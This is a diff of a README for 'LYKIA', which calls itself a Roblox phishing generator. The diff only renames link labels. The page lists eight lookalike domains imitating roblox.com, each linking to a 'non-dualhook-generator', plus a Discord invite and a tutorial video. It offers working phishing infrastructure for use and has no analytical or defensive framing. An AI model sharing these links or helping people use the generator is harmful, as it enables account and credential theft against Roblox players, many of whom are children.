@@ -1,20 +1,20 @@
 ### LYKIA [Roblox Phishing Generator]
 
-[roblox-app.com](https://roblox-app.com/creates/non-dualhook-generator)
+[Roblox-app.com Generator](https://roblox-app.com/creates/non-dualhook-generator)
 
-[roblox.com.lv](https://roblox.com.lv/creates/non-dualhook-generator)
+[Roblox.com.lv Generator](https://roblox.com.lv/creates/non-dualhook-generator)
 
-[roblox.com.sc](https://roblox.com.sc/generate/non-dualhook-generator)
+[Roblox.com.sc Generator](https://roblox.com.sc/generate/non-dualhook-generator)
 
-[vvvv-roblox.net](https://vvvv-roblox.net/creates/non-dualhook-generator)
+[vvvv-Roblox.net Generator](https://vvvv-roblox.net/creates/non-dualhook-generator)
 
-[vvvv-robiox.com](https://vvvv-robiox.com/creates/non-dualhook-generator)
+[vvvv-Robiox.com Generator](https://vvvv-robiox.com/creates/non-dualhook-generator)
 
-[roblox-site.com](https://roblox-site.com/creates/non-dualhook-generator)
+[Roblox-site.com Generator](https://roblox-site.com/creates/non-dualhook-generator)
 
-[apk-roblox.com](https://apk-roblox.com/creates/non-dualhook-generator)
+[apk-Roblox.com Generator](https://apk-roblox.com/creates/non-dualhook-generator)
 
-[roblox.sx](https://roblox.sx/creates/non-dualhook-generator)
+[Roblox.sx Generator](https://roblox.sx/creates/non-dualhook-generator)
 
 ## [Join Discord Server](https://discord.gg/YPHMeBGGWp)
-# [Tutorial](https://www.youtube.com/watch?v=MwPLp6T6TrU)
+# [Tutorial Video](https://www.youtube.com/watch?v=MwPLp6T6TrU)
